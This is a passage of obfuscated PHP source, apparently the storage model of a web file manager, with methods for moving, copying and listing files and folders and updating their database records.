$¢®ï¯); $ô©Ñçø = count($¢®ï¯); if ($ô©Ñçø == 0) { return $Ó¥©úø‡; } $ÉŠÆı·€ = $this->sourceInfo($Ó¥©úø‡); foreach ($¢®ï¯ as $‘ÑÁÒß…) { $Ñ¬Õ·¨¥ = $this->_makeItemData($‘ÑÁÒß…, $ÉŠÆı·€, $‘ÑÁÒß…[$Ê‹†­è‘[32]]); $Ñ¬Õ·¨¥[$Ê‹†­è‘[584]] = $‘ÑÁÒß…[$Ê‹†­è‘[584]]; $ó±´ï‹À[] = $Ñ¬Õ·¨¥; } $this->chunkEventSet($Ê‹†­è‘[639], array($Ê‹†­è‘[640], $ûûã‹¸, $ô©Ñçø)); $this->addAll($ó±´ï‹À, array(), !1); $Ø™à»šù = $this->where(array($Ê‹†­è‘[192] => $Ó¥©úø‡))->select(); $éØë”û¼ = $this->_childrenMakeRelation($¢®ï¯, $Ø™à»šù); $éØë”û¼[$í¥éœËŞ] = $Ó¥©úø‡; $Û¥ÄÁÔ = array(); $ÀÍ»á Ê = array(); foreach ($Ø™à»šù as $‘ÑÁÒß…) { $–æŠŸ« = $‘ÑÁÒß…[$Ê‹†­è‘[193]]; $Œå—‰ò = $this->_childrenMatch($éØë”û¼, $‘ÑÁÒß…, $ÉŠÆı·€); $Û¥ÄÁÔ[] = array($Ê‹†­è‘[193], $–æŠŸ«, $Ê‹†­è‘[192], $Œå—‰ò[$Ê‹†­è‘[192]]); $ÀÍ»á Ê[] = array($Ê‹†­è‘[193], $–æŠŸ«, $Ê‹†­è‘[584], $Œå—‰ò[$Ê‹†­è‘[584]]); $this->_copyApplyMeta($‘ÑÁÒß…, $Å…Ô·Òà); if ($‘ÑÁÒß…[$Ê‹†­è‘[485]] != $Ê‹†­è‘[91]) { $Å…Ô·Òà[$Ê‹†­è‘[629]][] = $‘ÑÁÒß…[$Ê‹†­è‘[541]]; } } $this->chunkEventSet($Ê‹†­è‘[641], array($Ê‹†­è‘[642], $ûûã‹¸, $ô©Ñçø)); $this->saveAll($Û¥ÄÁÔ); $this->chunkEventSet($Ê‹†­è‘[643], array($Ê‹†­è‘[644], $ûûã‹¸, $ô©Ñçø)); $this->saveAll($ÀÍ»á Ê); return $Ó¥©úø‡; } private function _childrenMakeRelation($ƒòß«¹Å, $®‘Úùß‘) { $Õ×í”± =& $_SERVER[²Ö÷öõ]; $–˜Öòµ = array(); $à™Ì¹è» = array(); foreach ($ƒòß«¹Å as $ûÀœ«‰) { $ª’é‰®â = $ûÀœ«‰[$Õ×í”±[32]] . $Õ×í”±[8] . $ûÀœ«‰[$Õ×í”±[584]]; $–˜Öòµ[$ª’é‰®â] = $ûÀœ«‰[$Õ×í”±[193]]; } foreach ($®‘Úùß‘ as $ûÀœ«‰) { $ª’é‰®â = $ûÀœ«‰[$Õ×í”±[32]] . $Õ×í”±[8] . $ûÀœ«‰[$Õ×í”±[584]]; $§±å³—¼ = $–˜Öòµ[$ª’é‰®â]; $à™Ì¹è»[$§±å³—¼] = $ûÀœ«‰[$Õ×í”±[193]]; } return $à™Ì¹è»; } private function _childrenMatch($¶îÚÄÕ, $ÙÈÓø­ğ, $Ïë«¥ê) { $§İÂßü =& $_SERVER[²Ö÷öõ]; $¿â’Å = $Ïë«¥ê[$§İÂßü[584]]; $’­ê² = $this->parentLevelArray($ÙÈÓø­ğ[$§İÂßü[584]]); foreach ($’­ê² as $ŸæŞ‹“È) { if (isset($¶îÚÄÕ[$ŸæŞ‹“È])) { $¿â’Å .= $¶îÚÄÕ[$ŸæŞ‹“È] . $§İÂßü[645]; } } $¿â’Å = rtrim($¿â’Å, $§İÂßü[50]) . $§İÂßü[50]; $ïó‚‡–­ = $this->parentLevelArray($¿â’Å); $ç® òÂ = $ïó‚‡–­[count($ïó‚‡–­) - 1]; return array($§İÂßü[192] => $ç® òÂ, $§İÂßü[584] => $¿â’Å); } private function _makeItemData($ª‡¯†ß¥, $áÉ‘õ‡Ø, $âıÈ¯¡) { $ÒçŒñò =& $_SERVER[²Ö÷öõ]; $šµ¯ã×Ù = array($ÒçŒñò[646] => $ª‡¯†ß¥[$ÒçŒñò[485]], $ÒçŒñò[494] => $âıÈ¯¡, $ÒçŒñò[647] => $ª‡¯†ß¥[$ÒçŒñò[486]] ? $ª‡¯†ß¥[$ÒçŒñò[486]] : $ÒçŒñò[12], $ÒçŒñò[542] => $ª‡¯†ß¥[$ÒçŒñò[541]] ? $ª‡¯†ß¥[$ÒçŒñò[541]] : 0, $ÒçŒñò[617] => $ª‡¯†ß¥[$ÒçŒñò[79]] ? $ª‡¯†ß¥[$ÒçŒñò[79]] : 0, $ÒçŒñò[648] => intval($áÉ‘õ‡Ø[$ÒçŒñò[190]]), $ÒçŒñò[649] => intval($áÉ‘õ‡Ø[$ÒçŒñò[569]]), $ÒçŒñò[650] => intval(USER_ID), $ÒçŒñò[651] => intval(USER_ID), $ÒçŒñò[477] => intval($áÉ‘õ‡Ø[$ÒçŒñò[193]]), $ÒçŒñò[652] => $áÉ‘õ‡Ø[$ÒçŒñò[584]] . $áÉ‘õ‡Ø[$ÒçŒñò[193]] . $ÒçŒñò[50], $ÒçŒñò[498] => $ª‡¯†ß¥[$ÒçŒñò[88]] ? $ª‡¯†ß¥[$ÒçŒñò[88]] : time(), $ÒçŒñò[504] => 0, $ÒçŒñò[653] => $ÒçŒñò[12]); return $šµ¯ã×Ù; } private function _copyApplyMeta($ÜŠÈò, &$´«µè‹) { $Éİæ’å =& $_SERVER[²Ö÷öõ]; $½Í½êƒÉ = $ÜŠÈò[$Éİæ’å[193]]; $óà¡ğÓŸ = $ÜŠÈò[$Éİæ’å[32]]; if (!isset($ÜŠÈò[$Éİæ’å[654]]) || !$ÜŠÈò[$Éİæ’å[654]] || $ÜŠÈò[$Éİæ’å[654]] == $Éİæ’å[228]) { $´«µè‹[$Éİæ’å[631]][] = array($Éİæ’å[193], $½Í½êƒÉ, $Éİæ’å[654], short_id($½Í½êƒÉ)); } if (Input::check($óà¡ğÓŸ, $Éİæ’å[655])) { $´«µè‹[$Éİæ’å[630]][] = array($Éİæ’å[193] => $½Í½êƒÉ, $Éİæ’å[97] => $Éİæ’å[538], $Éİæ’å[450] => str_replace($Éİæ’å[53], $Éİæ’å[12], Pinyin::get($óà¡ğÓŸ))); $´«µè‹[$Éİæ’å[630]][] = array($Éİæ’å[193] => $½Í½êƒÉ, $Éİæ’å[97] => $Éİæ’å[537], $Éİæ’å[450] => Pinyin::get($óà¡ğÓŸ, $Éİæ’å[656])); } $´«µè‹[$Éİæ’å[630]][] = array($Éİæ’å[193] => $½Í½êƒÉ, $Éİæ’å[97] => $Éİæ’å[517], $Éİæ’å[450] => KodSort::makeStr($óà¡ğÓŸ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($œšÈş˜Ä) { $ŠüÈÂ‚ =& $_SERVER[²Ö÷öõ]; $®˜Ïå… = $this->sourceInfo($œšÈş˜Ä); $¿Š€ƒƒƒ = $ŠüÈÂ‚[657]; $¯ŸËÌ¼… = array($ŠüÈÂ‚[584] => array($ŠüÈÂ‚[612], $®˜Ïå…[$ŠüÈÂ‚[584]] . $œšÈş˜Ä . $ŠüÈÂ‚[613]), $ŠüÈÂ‚[505] => $this->targetIsDelete); $¢ÎÍÚöÛ = $this->field($¿Š€ƒƒƒ)->where($¯ŸËÌ¼…)->select(); if (!$¢ÎÍÚöÛ) { return; } $¢ÎÍÚöÛ = array_to_keyvalue($¢ÎÍÚöÛ, $ŠüÈÂ‚[193]); foreach ($¢ÎÍÚöÛ as $£Ú„Ï‚©) { $êÀôÓ´á = $£Ú„Ï‚©[$ŠüÈÂ‚[192]]; $œšÈş˜Ä = $£Ú„Ï‚©[$ŠüÈÂ‚[193]]; if (!isset($this->_childrenListCache[$œšÈş˜Ä]) && $£Ú„Ï‚©[$ŠüÈÂ‚[485]] == $ŠüÈÂ‚[91]) { $this->_childrenListCache[$œšÈş˜Ä] = array(); } if (!isset($this->_childrenListCache[$êÀôÓ´á])) { $this->_childrenListCache[$êÀôÓ´á] = array(); } $this->_childrenListCache[$êÀôÓ´á][$œšÈş˜Ä] = $£Ú„Ï‚©; $this->_childrenItemCache[$œšÈş˜Ä] = $£Ú„Ï‚©; } } private function _childrenListAll($ï¢Ãß¶Ë, &$€ô”Ê¬Î) { $ê†Öäšà =& $_SERVER[²Ö÷öõ]; if (!isset($this->_childrenListCache[$ï¢Ãß¶Ë])) { return; } $œ×¼á¡Ã = $this->_childrenListCache[$ï¢Ãß¶Ë]; foreach ($œ×¼á¡Ã as $¡ïñ‡ÚÉ => $Ã¢ŸÄ÷) { $€ô”Ê¬Î[$¡ïñ‡ÚÉ] = $Ã¢ŸÄ÷; if ($Ã¢ŸÄ÷[$ê†Öäšà[485]] == $ê†Öäšà[91]) { $this->_childrenListAll($¡ïñ‡ÚÉ, $€ô”Ê¬Î); } } } private function sourceInfoCache($£Ìôõ‚æ) { if (isset($this->_childrenItemCache[$£Ìôõ‚æ])) { return $this->_childrenItemCache[$£Ìôõ‚æ]; } return $this->sourceInfo($£Ìôõ‚æ); } private function _childrenList($——ì£“ì) { if (isset($this->_childrenListCache[$——ì£“ì])) { return $this->_childrenListCache[$——ì£“ì]; } return $this->_childrenListSelect($——ì£“ì); } private function _childrenListSelect($Ş‹çïº) { $‹‡®²Ò =& $_SERVER[²Ö÷öõ]; $†Î½½à” = array($‹‡®²Ò[192] => $Ş‹çïº, $‹‡®²Ò[505] => $this->targetIsDelete); $¿®é¤ú = $this->where($†Î½½à”)->select(); $¿®é¤ú = $¿®é¤ú ? $¿®é¤ú : array(); $ÇÕÈ€ª³ = array_to_keyvalue($¿®é¤ú, $‹‡®²Ò[193]); $this->_childrenListCache[$Ş‹çïº] = $ÇÕÈ€ª³; foreach ($ÇÕÈ€ª³ as $Ş‹çïº => $Ô²¡ûì) { $this->_childrenItemCache[$Ş‹çïº] = $Ô²¡ûì; } return $ÇÕÈ€ª³; } private function fileNameExistAuto($“ò¬¼ìÕ, $ş·£Çìá) { $úÁ°œ£Ó =& $_SERVER[²Ö÷öõ]; if ($ş·£Çìá[$úÁ°œ£Ó[505]] == $úÁ°œ£Ó[91]) { return $this->fileNameExist($“ò¬¼ìÕ, $ş·£Çìá[$úÁ°œ£Ó[32]]); } return $this->fileNameExistCache($“ò¬¼ìÕ, $ş·£Çìá[$úÁ°œ£Ó[32]]); } private function fileNameExistCache($îˆîÓ¶¹, $·ë¯œ–ê) { $ñ–ÕÛª‘ =& $_SERVER[²Ö÷öõ]; $·ë¯œ–ê = strtolower($·ë¯œ–ê); $Òı˜ÄÌ§ = $this->_childrenList($îˆîÓ¶¹); foreach ($Òı˜ÄÌ§ as $Ã’­ãİ) { if ($·ë¯œ–ê == strtolower($Ã’­ãİ[$ñ–ÕÛª‘[32]])) { return $Ã’­ãİ[$ñ–ÕÛª‘[193]]; } } return !1; } private function fileNameAutoCache($é¦°ŠÒ, $ÕàÅÂë“, $şŸ£ğÎ, $÷è§ŒÊÒ) { $Ë¯«—¤ü =& $_SERVER[²Ö÷öõ]; $«Ô¿˜ò = $this->_childrenList($é¦°ŠÒ); $àÌÃÃå° = array_to_keyvalue($«Ô¿˜ò, $Ë¯«—¤ü[12], $Ë¯«—¤ü[32]); return $this->fileNameAutoGet($àÌÃÃå°, $ÕàÅÂë“, $şŸ£ğÎ, $÷è§ŒÊÒ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($»ºô¨‡, $ˆˆÓ±ÕË, $á¡ª™‹ = REPEAT_REPLACE, $¢¡£Òµ© = '') { $¬ÁúÆÂš =& $_SERVER[²Ö÷öõ]; $ÇÌÒ¥ìÑ = $this->sourceInfo($»ºô¨‡); $ùÕãÆó = $this->sourceInfo($ˆˆÓ±ÕË); if ($ÇÌÒ¥ìÑ[$¬ÁúÆÂš[192]] == $ùÕãÆó[$¬ÁúÆÂš[193]]) { if ($ÇÌÒ¥ìÑ[$¬ÁúÆÂš[505]] == $¬ÁúÆÂš[91]) { Model($¬ÁúÆÂš[503])->restore(array($»ºô¨‡)); } if (!$¢¡£Òµ© || $¢¡£Òµ© == $ÇÌÒ¥ìÑ[$¬ÁúÆÂš[32]]) { return $»ºô¨‡; } } $œşº†í = $this->pathInfoMore($»ºô¨‡); if ($this->isParentOf($»ºô¨‡, $ˆˆÓ±ÕË)) { return !1; } if (!$ÇÌÒ¥ìÑ || !$ùÕãÆó || $ùÕãÆó[$¬ÁúÆÂš[485]] != $¬ÁúÆÂš[91]) { return !1; } Hook::trigger($¬ÁúÆÂš[658], $œşº†í); $this->targetIsDelete = intval($ÇÌÒ¥ìÑ[$¬ÁúÆÂš[505]]); if ($ÇÌÒ¥ìÑ[$¬ÁúÆÂš[192]] == $ˆˆÓ±ÕË && $¢¡£Òµ© != $ÇÌÒ¥ìÑ[$¬ÁúÆÂš[32]]) { $ö©›Œ = $this->fileNameExist($ˆˆÓ±ÕË, $¢¡£Òµ©); if ($ö©›Œ && $ÇÌÒ¥ìÑ[$¬ÁúÆÂš[485]] == $¬ÁúÆÂš[228]) { $ÓáçÍš÷ = $this->sourceInfo($ö©›Œ); $ØÆí›š = $this->fileHistory($ÓáçÍš÷, $ÇÌÒ¥ìÑ[$¬ÁúÆÂš[541]], $ÇÌÒ¥ìÑ[$¬ÁúÆÂš[79]]); if (!$ØÆí›š) { Model($¬ÁúÆÂš[544])->remove($ÇÌÒ¥ìÑ[$¬ÁúÆÂš[541]]); } $this->removeNow($»ºô¨‡, !1); $this->folderSizeReset($ˆˆÓ±ÕË); Hook::trigger($¬ÁúÆÂš[659], $œşº†í); return $ö©›Œ; } } $¤êàƒÆ = $¢¡£Òµ© ? $¢¡£Òµ© : $ÇÌÒ¥ìÑ[$¬ÁúÆÂš[32]]; $this->lockMoveStart($»ºô¨‡); $this->lockWriteStart($ˆˆÓ±ÕË, $¤êàƒÆ); $èá¡€¶ç = array($¬ÁúÆÂš[629] => array(), $¬ÁúÆÂš[660] => !1); $this->clearShare($»ºô¨‡, $ˆˆÓ±ÕË); $¤½”îÚ² = $this->fileNameExistAuto($ˆˆÓ±ÕË, $ÇÌÒ¥ìÑ); $²öä¢§ = $this->_move($»ºô¨‡, $ˆˆÓ±ÕË, $á¡ª™‹, $èá¡€¶ç, $¢¡£Òµ©); $this->sourceCacheClear(); if ($ÇÌÒ¥ìÑ[$¬ÁúÆÂš[485]] == $¬ÁúÆÂš[91] && $¤½”îÚ²) { $this->folderSizeResetChildren($²öä¢§); } Model($¬ÁúÆÂš[230])->linkAdd($èá¡€¶ç[$¬ÁúÆÂš[629]]); if ($¤½”îÚ² && $èá¡€¶ç[$¬ÁúÆÂš[660]]) { $this->removeNow($»ºô¨‡, !1); } $this->lockMoveEnd($»ºô¨‡); $this->lockWriteEnd($ˆˆÓ±ÕË, $¤êàƒÆ); $this->folderSizeReset($ÇÌÒ¥ìÑ[$¬ÁúÆÂš[192]]); $this->folderSizeReset($ˆˆÓ±ÕË); $ÇÛè…»Ü = array($ÇÌÒ¥ìÑ[$¬ÁúÆÂš[192]], $ˆˆÓ±ÕË); if ($ÇÌÒ¥ìÑ[$¬ÁúÆÂš[485]] == $¬ÁúÆÂš[91]) { $ÇÛè…»Ü[] = $»ºô¨‡; } $this->updateModifyTime($ÇÛè…»Ü); Model($¬ÁúÆÂš[633])->eventMove($»ºô¨‡, $ÇÌÒ¥ìÑ[$¬ÁúÆÂš[192]], $ˆˆÓ±ÕË); Hook::trigger($¬ÁúÆÂš[659], $œşº†í); return $²öä¢§; } private function _move($³ºô¤›¢, $ÃÖ¨’ı±, $íñêò‘, &$Ş¦áÎ‹”, $ÜóÓ“¨ç = '') { $ıë¶±ƒÊ =& $_SERVER[²Ö÷öõ]; $İÙÂñŞ´ = $this->sourceInfo($³ºô¤›¢); $©…í«Õ² = $İÙÂñŞ´[$ıë¶±ƒÊ[485]] == $ıë¶±ƒÊ[91]; $ˆŸ ½áñ = $ÜóÓ“¨ç ? $ÜóÓ“¨ç : $İÙÂñŞ´[$ıë¶±ƒÊ[32]]; $š×­Éêş = $this->fileNameExistAuto($ÃÖ¨’ı±, $İÙÂñŞ´); $this->lockMoveStart($³ºô¤›¢); $this->lockWriteStart($ÃÖ¨’ı±, $ˆŸ ½áñ); if (!$š×­Éêş) { return $this->_moveForce($³ºô¤›¢, $ÃÖ¨’ı±, $ˆŸ ½áñ); } $âñìÔÇõ = $š×­Éêş; $ÙÀÑõé = !1; if ($©…í«Õ²) { if ($íñêò‘ == REPEAT_RENAME_FOLDER) { $ˆŸ ½áñ = $this->fileNameAuto($ÃÖ¨’ı±, $ˆŸ ½áñ, $íñêò‘, $©…í«Õ²); $âñìÔÇõ = $this->_moveForce($³ºô¤›¢, $ÃÖ¨’ı±, $ˆŸ ½áñ); } else { if ($íñêò‘ == REPEAT_RENAME_FOLDER) { $íñêò‘ = REPEAT_RENAME; } $§ôËæàÙ = $this->_childrenListSelect($³ºô¤›¢); foreach ($§ôËæàÙ as $ èƒÚ’”) { $this->_move($ èƒÚ’”[$ıë¶±ƒÊ[193]], $š×­Éêş, $íñêò‘, $Ş¦áÎ‹”); } $ÙÀÑõé = !0; } } else { if ($íñêò‘ == REPEAT_SKIP) { $ÙÀÑõé = !0; } else { if ($íñêò‘ == REPEAT_RENAME || $íñêò‘ == REPEAT_RENAME_FOLDER) { $ˆŸ ½áñ = $this->fileNameAuto($ÃÖ¨’ı±, $ˆŸ ½áñ, $íñêò‘, $©…í«Õ²); $âñìÔÇõ = $this->_moveForce($³ºô¤›¢, $ÃÖ¨’ı±, $ˆŸ ½áñ); } else { if ($íñêò‘ == REPEAT_REPLACE) { $ÚÀ™Şïç = $this->sourceInfoCache($š×­Éêş); $÷Ê‡ÁæŸ = $this->fileHistory($ÚÀ™Şïç, $İÙÂñŞ´[$ıë¶±ƒÊ[541]], $İÙÂñŞ´[$ıë¶±ƒÊ[79]]); $ÙÀÑõé = !0; if ($÷Ê‡ÁæŸ) { $Ş¦áÎ‹”[$ıë¶±ƒÊ[629]][] = $İÙÂñŞ´[$ıë¶±ƒÊ[541]]; } } } } } if ($ÙÀÑõé && !$Ş¦áÎ‹”[$ıë¶±ƒÊ[660]]) { $Ş¦áÎ‹”[$ıë¶±ƒÊ[660]] = !0; } return $âñìÔÇõ; } private function _moveForce($—û˜œ „, $€¶“÷ıæ, $ÎŠâúµÈ) { $â‡°µç¬ =& $_SERVER[²Ö÷öõ]; $à¸ĞöÜ¾ = $this->sourceInfo($—û˜œ „); $Öñç›ÕÄ = $this->sourceInfo($€¶“÷ıæ); $ïæœ‚áæ = $à¸ĞöÜ¾[$â‡°µç¬[485]] == $â‡°µç¬[91]; $ş‘ŸÈà« = array($â‡°µç¬[477] => $Öñç›ÕÄ[$â‡°µç¬[193]], $â‡°µç¬[652] => $Öñç›ÕÄ[$â‡°µç¬[584]] . $Öñç›ÕÄ[$â‡°µç¬[193]] . $â‡°µç¬[50], $â‡°µç¬[648] => $Öñç›ÕÄ[$â‡°µç¬[190]], $â‡°µç¬[649] => $Öñç›ÕÄ[$â‡°µç¬[569]], $â‡°µç¬[651] => USER_ID, $â‡°µç¬[494] => $ÎŠâúµÈ); $ÒØŒ÷Šê = $à¸ĞöÜ¾[$â‡°µç¬[190]] == SourceModel::TYPE_GROUP && $Öñç›ÕÄ[$â‡°µç¬[190]] == SourceModel::TYPE_GROUP && $à¸ĞöÜ¾[$â‡°µç¬[569]] == $Öñç›ÕÄ[$â‡°µç¬[569]]; if (!$ÒØŒ÷Šê && $this->moveClearAuth) { Model($â‡°µç¬[567])->authClear($—û˜œ „); } $‡ÎÄÔ£¿ = $à¸ĞöÜ¾[$â‡°µç¬[505]] == $â‡°µç¬[91] && $Öñç›ÕÄ[$â‡°µç¬[505]] != $â‡°µç¬[91]; if ($‡ÎÄÔ£¿) { $ş‘ŸÈà«[$â‡°µç¬[504]] = 0; } if ($ïæœ‚áæ) { $œ×»µ–ğ = array($â‡°µç¬[652] => array($â‡°µç¬[612], $à¸ĞöÜ¾[$â‡°µç¬[584]] . $à¸ĞöÜ¾[$â‡°µç¬[193]] . $â‡°µç¬[613])); $¾Õˆ×ÀÜ = $à¸ĞöÜ¾[$â‡°µç¬[584]] . $à¸ĞöÜ¾[$â‡°µç¬[193]] . $â‡°µç¬[50]; $Ì¬ßÄÔ = $Öñç›ÕÄ[$â‡°µç¬[584]] . $Öñç›ÕÄ[$â‡°µç¬[193]] . $â‡°µç¬[50] . $à¸ĞöÜ¾[$â‡°µç¬[193]] . $â‡°µç¬[50]; $Š¸òğ— = array($â‡°µç¬[652] => array($â‡°µç¬[661], "\162\145\x70\154\x61\x63\x65\50\x70\x61\162\145\156\x74\x4c\145\x76\x65\154\54\x27{$¾Õˆ×ÀÜ}\47\54\x27{$Ì¬ßÄÔ}\x27\x29"), $â‡°µç¬[648] => $Öñç›ÕÄ[$â‡°µç¬[190]], $â‡°µç¬[649] => $Öñç›ÕÄ[$â‡°µç¬[569]]); if ($‡ÎÄÔ£¿) { $Š¸òğ—[$â‡°µç¬[504]] = 0; } $this->where($œ×»µ–ğ)->data($Š¸òğ—)->save(); } $this->where(array($â‡°µç¬[491] => $—û˜œ „))->data($ş‘ŸÈà«)->save(); return $—û˜œ „; } private function clearShare($©ÅÄ×Ü, $æ–Î±¥) { $ğ…¨ÒÙ© =& $_SERVER[²Ö÷öõ]; $‰Ñ‘ç½ = $this->sourceInfo($©ÅÄ×Ü); $ü™÷î«Ş = $this->sourceInfo($æ–Î±¥); if ($‰Ñ‘ç½[$ğ…¨ÒÙ©[569]] == $ü™÷î«Ş[$ğ…¨ÒÙ©[569]] && $‰Ñ‘ç½[$ğ…¨ÒÙ©[190]] == $ğ…¨ÒÙ©[662]) { return; } $¶şë©œì = array($ğ…¨ÒÙ©[584] => array($ğ…¨ÒÙ©[612], $‰Ñ‘ç½[$ğ…¨ÒÙ©[584]] . $©ÅÄ×Ü . $ğ…¨ÒÙ©[613])); $»÷Îˆ² = $this->field($ğ…¨ÒÙ©[491])->where($¶şë©œì)->getField($ğ…¨ÒÙ©[193], !0); if (!$»÷Îˆ²) { return; } $¶şë©œì = array($ğ…¨ÒÙ©[193] => array($ğ…¨ÒÙ©[7], $»÷Îˆ²), $ğ…¨ÒÙ©[663] => 1); $„Ñ“©Ô¾ = Model($ğ…¨ÒÙ©[664])->field($ğ…¨ÒÙ©[665])->where($¶şë©œì)->select(); if (!$„Ñ“©Ô¾) { return; } $„Ñ“©Ô¾ = array_to_keyvalue($„Ñ“©Ô¾, $ğ…¨ÒÙ©[12], $ğ…¨ÒÙ©[665]); $¶şë©œì = array($ğ…¨ÒÙ©[665] => array($ğ…¨ÒÙ©[7], $„Ñ“©Ô¾)); Model($ğ…¨ÒÙ©[664])->where($¶şë©œì)->save(array($ğ…¨ÒÙ©[663] => 0)); Model($ğ…¨ÒÙ©[666])->where($¶şë©œì)->delete(); } public function copyFolderFromIO($•…ÚĞ¥, $è¶öƒ‘á, $­æ¶š§è, $‡Ú§€†Ì, $ ™Åùœ”, $ª÷¸¢´ = false) { $ë·é¡å =& $_SERVER[²Ö÷öõ]; $å‘‘şÇö = array($ë·é¡å[630] => array(), $ë·é¡å[631] => array(), $ë·é¡å[629] => array(), $ë·é¡å[667] => array()); $¢¡‡İòû = $ª÷¸¢´ ? $ª÷¸¢´ : $•…ÚĞ¥->pathThis($è¶öƒ‘á); $€ôÊàõ´ = $this->fileNameExist($­æ¶š§è, $¢¡‡İòû); $ş‰Õ¨×å = $this->mkdir($­æ¶š§è, $¢¡‡İòû, $‡Ú§€†Ì); if (!$€ôÊàõ´ || $‡Ú§€†Ì == REPEAT_RENAME_FOLDER) { $‡Ú§€†Ì = !1; } if ($€ôÊàõ´) { $this->_childrenAllMake($€ôÊàõ´); } Hook::trigger($ë·é¡å[668]); $this->_copyChildTo($•…ÚĞ¥, $è¶öƒ‘á, $ş‰Õ¨×å, $‡Ú§€†Ì, $å‘‘şÇö, $ ™Åùœ”); Hook::trigger($ë·é¡å[669]); if ($ş‰Õ¨×å) { $this->folderSizeResetChildren($ş‰Õ¨×å); } $this->_childrenListClear(); Model($ë·é¡å[632])->addAll($å‘‘şÇö[$ë·é¡å[630]], array(), !0); Model($ë·é¡å[633])->eventCopy($ş‰Õ¨×å); $this->saveAll($å‘‘şÇö[$ë·é¡å[631]]); Model($ë·é¡å[544])->linkAdd($å‘‘şÇö[$ë·é¡å[629]]); Model($ë·é¡å[544])->remove($å‘‘şÇö[$ë·é¡å[667]]); $this->folderSizeReset($­æ¶š§è); $this->updateModifyTime($­æ¶š§è); return $ş‰Õ¨×å; } private function _copyChildTo($œ¸„Òğ», $‰ö­íÔ¼, $õÊö¥ºö, $Šë³œá¢, &$Ğ¸ã¶, $õÊÎËùä) { $¿ßƒ«­Ó =& $_SERVER[²Ö÷öõ]; $âëÑ = $this->sourceInfoCache($õÊö¥ºö); $ÎÓıÅ‘£ = $œ¸„Òğ»->listPath($‰ö­íÔ¼); $ÎÓıÅ‘£ = $ÎÓıÅ‘£ ? $ÎÓıÅ‘£ : array($¿ßƒ«­Ó[86] => array(), $¿ßƒ«­Ó[85] => array()); $¾íéØÊ = array_merge($ÎÓıÅ‘£[$¿ßƒ«­Ó[86]], $ÎÓıÅ‘£[$¿ßƒ«­Ó[85]]); $œ…™ÊÉ = $this->_addFiles($œ¸„Òğ», $ÎÓıÅ‘£[$¿ßƒ«­Ó[86]], $õÊÎËùä); $à±’‹ŒÅ = array(); foreach ($¾íéØÊ as &$ˆö‡Óì˜) { if (isset($œ…™ÊÉ[$ˆö‡Óì˜[$¿ßƒ«­Ó[32]]])) { $ˆö‡Óì˜ = $œ…™ÊÉ[$ˆö‡Óì˜[$¿ßƒ«­Ó[32]]]; } $ˆö‡Óì˜[$¿ßƒ«­Ó[485]] = $ˆö‡Óì˜[$¿ßƒ«­Ó[33]] == $¿ßƒ«­Ó[78]; $ˆö‡Óì˜[$¿ßƒ«­Ó[486]] = substr(_get($ˆö‡Óì˜, $¿ßƒ«­Ó[169], $¿ßƒ«­Ó[12]), 0, 10); $ˆö‡Óì˜[$¿ßƒ«­Ó[79]] = _get($ˆö‡Óì˜, $¿ßƒ«­Ó[79], 0); $ˆö‡Óì˜[$¿ßƒ«­Ó[541]] = _get($ˆö‡Óì˜, $¿ßƒ«­Ó[541], 0); if (!isset($ˆö‡Óì˜[$¿ßƒ«­Ó[670]]) && $ˆö‡Óì˜[$¿ßƒ«­Ó[541]]) { $Ğ¸ã¶[$¿ßƒ«­Ó[667]][] = $ˆö‡Óì˜[$¿ßƒ«­Ó[541]]; } if ($Šë³œá¢) { $¥Ö…á¿ı = $this->fileNameExistCache($õÊö¥ºö, $ˆö‡Óì˜[$¿ßƒ«­Ó[32]]); if ($¥Ö…á¿ı) { if ($ˆö‡Óì˜[$¿ßƒ«­Ó[485]] || $Šë³œá¢ == REPEAT_SKIP) { continue; } if ($Šë³œá¢ == REPEAT_REPLACE) { $­®À•Î© = $this->sourceInfoCache($¥Ö…á¿ı); $ù·–Ô‘à = $this->fileHistory($­®À•Î©, $ˆö‡Óì˜[$¿ßƒ«­Ó[541]], $ˆö‡Óì˜[$¿ßƒ«­Ó[79]]); if ($ù·–Ô‘à) { $Ğ¸ã¶[$¿ßƒ«­Ó[629]][] = $ˆö‡Óì˜[$¿ßƒ«­Ó[541]]; } continue; } else { if ($Šë³œá¢ == REPEAT_RENAME) { $ˆö‡Óì˜[$¿ßƒ«­Ó[32]] = $this->fileNameAutoCache($õÊö¥ºö, $ˆö‡Óì˜[$¿ßƒ«­Ó[32]], $Šë³œá¢, !1); } } } } if (!$ˆö‡Óì˜[$¿ßƒ«­Ó[485]] && $ˆö‡Óì˜[$¿ßƒ«­Ó[541]] == 0) { continue; } if (!$ˆö‡Óì˜[$¿ßƒ«­Ó[485]] && $ˆö‡Óì˜[$¿ßƒ«­Ó[541]]) { $Ğ¸ã¶[$¿ßƒ«­Ó[629]][] = $ˆö‡Óì˜[$¿ßƒ«­Ó[541]]; } $à±’‹ŒÅ[] = $this->_makeItemData($ˆö‡Óì˜, $âëÑ, $ˆö‡Óì˜[$¿ßƒ«­Ó[32]]); } unset($ˆö‡Óì˜); if (!empty($à±’‹ŒÅ)) { $this->addAll($à±’‹ŒÅ); $this->_childrenListSelect($õÊö¥ºö); } $´Ã³ªá… = $this->_childrenList($õÊö¥ºö); $´Ã³ªá… = array_to_keyvalue($´Ã³ªá…, $¿ßƒ«­Ó[32]); foreach ($¾íéØÊ as $ˆö‡Óì˜) { $­®À•Î© = $´Ã³ªá…[$ˆö‡Óì˜[$¿ßƒ«­Ó[32]]]; $ÌÓ†“É = $­®À•Î©[$¿ßƒ«­Ó[193]]; $this->_copyApplyMeta($­®À•Î©, $Ğ¸ã¶); if ($ˆö‡Óì˜[$¿ßƒ«­Ó[33]] == $¿ßƒ«­Ó[78]) { $ˆö‡Óì˜[$¿ßƒ«­Ó[87]] = $œ¸„Òğ»->getPathInner($ˆö‡Óì˜[$¿ßƒ«­Ó[87]]); $this->_copyChildTo($œ¸„Òğ», $ˆö‡Óì˜[$¿ßƒ«­Ó[87]], $ÌÓ†“É, $Šë³œá¢, $Ğ¸ã¶, $õÊÎËùä); } } } private function _addFiles($áŠÕÓª·, $ÕäªäÃª, $¬Úê†¨) { $Ÿáñ†‡û =& $_SERVER[²Ö÷öõ]; if (!$ÕäªäÃª || count($ÕäªäÃª) == 0) { return array(); } $ÇÛí¡µ› = array(); foreach ($ÕäªäÃª as &$§ÑØö¦ƒ) { Hook::trigger($Ÿáñ†‡û[671], $§ÑØö¦ƒ); 